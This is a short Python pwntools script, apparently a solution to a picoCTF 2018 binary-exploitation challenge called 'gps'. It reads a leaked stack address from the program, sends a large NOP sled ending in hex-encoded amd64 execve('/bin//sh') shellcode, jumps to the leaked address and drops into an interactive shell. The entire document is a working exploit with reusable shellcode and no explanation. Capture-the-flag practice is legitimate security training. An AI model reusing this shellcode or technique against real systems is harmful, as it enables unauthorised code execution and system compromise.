from pwn import *

context.arch='amd64'

p = process('./gps')
#p = remote('2018shell3.picoctf.com', 24627)

info = p.recvuntil('>').split('\n')
addr = int(info[9].split(' ')[2][2:], 16)

sh = '\x48\x31\xF6\x48\x31\xD2\x56\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x89\xE7\x48\x31\xC0\x48\x83\xF0\x3B\x0F\x05'
payload = '\x90'*(0xfff-len(sh)) + sh
p.sendline(payload)
p.sendafter('>', hex(addr))

p.interactive()
